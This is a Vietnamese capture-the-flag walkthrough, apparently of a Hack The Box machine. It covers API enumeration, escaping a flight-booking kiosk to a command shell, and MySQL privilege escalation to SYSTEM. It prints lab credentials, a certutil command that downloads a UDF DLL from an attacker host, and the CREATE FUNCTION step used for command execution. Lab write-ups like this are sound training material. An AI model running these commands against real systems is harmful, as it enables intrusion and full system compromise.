Trước tiên tôi sử dụng nmap để quét các cổng đang mở trên IP

![img](img/nmap.png?raw=true)

Đáng chú ý ở đây là có một trang login ở cổng 8443. Trước tiên hãy thử truy cập vào cổng này để quan sát

![img](img/port8443.png?raw=true)

Khi tôi trỏ vào Forgot your password? có xuất hiện một đoạn gợi ý `The default password is the device serial number included in your DeviceHub packaging.`. Điều này chứng minh để đăng nhập chúng ta phải tìm số serial của thiết bị này. Trước tiên tôi thử sử dụng gobuster để quét các path ẩn

![img](img/gobuster1.png?raw=true)

Xuất hiện một path là /api, chúng ta hãy quét tìm với endpoint là /api

![img](img/gobuster2.png?raw=true)

Ở đây xuất hiện 2 endpoint là scan và status. Trước tiên hãy truy cập thử status để xem kết quả trả về

![img](img/status.png?raw=true)

Trong response trả về có một giá trị serial đây có thể chính là password cần để đăng nhập trang 

![img](img/login_success.png?raw=true)

Ở đây có thể tìm thấy username và password, hãy thực hiện kết nối bằng xfreerdp3 với thông tin xác thực này. Sau khi vào tôi đã được truy cập ngay vào một trang đặt chỗ chuyến bay

![img](img/xfreerdp3_success.png?raw=true)

Giờ ta có thể đọc lại gợi ý của machine này `In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they'll come in handy here? Jenny Crawford / KS7X2M`. Đây chính là thông tin mà ta có thể nhập vào trường này. Khi nhấn nút quét, một thông báo lỗi chung chung xuất hiện.

![img](img/scan_failed.png?raw=true)

Bảng điều khiển DeviceHub có các tùy chọn quản lý nguồn cho máy quét, tôi đã tắt thiết bị thông qua đó:

`POST /api/scanner/power
{"powered": false}`

![img](img/scanner.png?raw=true)

Quay lại trang tôi ấn quét và đã trả về lỗi

![img](img/xfreerdp3.png?raw=true)

Tôi ấn vào link và đã ra chuyển hướng ra được browser. Ở đây nếu như cấu hình sai chúng ta có thể mở cmd từ browser. Hãy mở cmd ở `C:\Windows\System32\cmd.exe`
# User_flag
Và giờ ta có thể đọc file user.txt để lấy flag của user

`type C:\Users\KioskUser\Desktop\user.txt`

![img](img/usertxt.png?raw=true)
# Root_flag
Việc liệt kê thư mục C:\Program Files cho thấy hai thư mục của nhà cung cấp:

- C:\Program Files\HTB Airways\Kiosk\          ← Ứng dụng kiosk chạy bằng Node/TypeScript
- C:\Program Files\Nexion Systems\DocReader\   ← Backend DeviceHub dựa trên .NET
- C:\Program Files\Nexion Systems\Printer\     ← Dịch vụ máy in

Khi liệt kê thư mục gốc C:\, phát hiện thấy một bản cài đặt **MySQL 8.0** độc lập tại C:\MySQL\. Việc cài đặt cơ sở dữ liệu ngay tại thư mục gốc là một điểm bất thường — đây là dấu hiệu cho thấy hệ thống này tự vận hành cơ sở dữ liệu cục bộ.
Ứng dụng kiosk này là một monorepo (kho lưu trữ mã nguồn tập trung) sử dụng Node.js:
```
packages\
  backend\
    src\
      config\
      data\
      database\
      integrations\
      middleware\
      routes\
      schemas\
      services\
```
Thư mục "database" thường được đặt theo quy ước — mã nguồn kết nối với cơ sở dữ liệu hầu như luôn nằm tại đó. Giờ ta đọc file DB config trong thư mục

`C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts`

![img](img/database.png?raw=true)

Ở đây chúng ta nhận lại thông tin xác thực để truy cập vào mysql. Trước tiên chúng ta hãy xem các cơ sở dữ liệu

`mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 -e "SHOW DATABASES;"`

![img](img/showdatabase.png?raw=true)

Chúng ta có thể thấy htb_alrways đã được nhắc trong file cấu hình giờ hãy xem các bảng trong cơ sở dữ liệu này bằng lệnh `SHOW TABLES`. Sau khi thấy được thông tin các cột tôi trích xuất nó ra 

![img](img/extractdatabase.png?raw=true)

Quy trình sử dụng thẻ nhân viên tại ki-ốt (theo tệp src/routes/staff.ts) yêu cầu mã QR có định dạng `HTBAW-STAFF:<email>:<authCode>`. Do các mã này được lưu dưới dạng văn bản thuần (plaintext) trong cơ sở dữ liệu, bất kỳ tài khoản nhân viên nào cũng có thể bị làm giả — tuy nhiên, đây không phải là con đường dẫn đến việc leo thang đặc quyền

Sau khi liệt kê thư mục C:\ProgramData\HTB Airways\ tôi đã phát hiện một số tệp tin, trong đó có một tập lệnh (script) được lên lịch chạy mà người dùng có thể đọc được và không được bảo mật chặt chẽ: `C:\ProgramData\HTB Airways\refresh-dates.bat`

![img](img/refresh.png?raw=true)

Ở đây chúng ta nhận được passsword của root trong mysql. Giờ kiểm tra quyền đọc/ghi file trên hệ thống của tài khoản root trong cơ sở dữ liệu MySQL 

`mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, File_priv FROM mysql.user WHERE user='root';"`

![img](img/mysqlroot.png?raw=true)

File_priv = Y — đây là điều kiện tiên quyết để thực hiện UDF hijacking

Tiếp theo hãy tìm đường dẫn đến thư mục chứa các plugin (tiện ích mở rộng) của MySQL trên máy chủ

![img](img/variables.png?raw=true)

Tiếp theo chúng ta có thể tìm trong chính máy local kali file `lib_mysqludf_sys_64.dll` trong mysql. Sau đó để tải file dll này lên dùng lệnh:

`certutil -urlcache -split -f http://<ATTACKER_IP>:<HTTP_PORT>/lib_mysqludf_sys_64.dll ^
  C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll`


Sau đó đăng ký hàm UDF bằng lệnh:

`mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"`

![img](img/uploaddll.png?raw=true)

Giờ hãy thử thực hiện lệnh whoami để xem thành công chưa

![img](img/whoami.png?raw=true)

Vậy là đã thực hiện thành công lệnh whoami khi tôi giải mã nó bằng hex ra thu được `nt authority\system`. Chỉ cần đọc file root.txt để lấy flag cuối cùng

![img](img/root.txt.png?raw=true)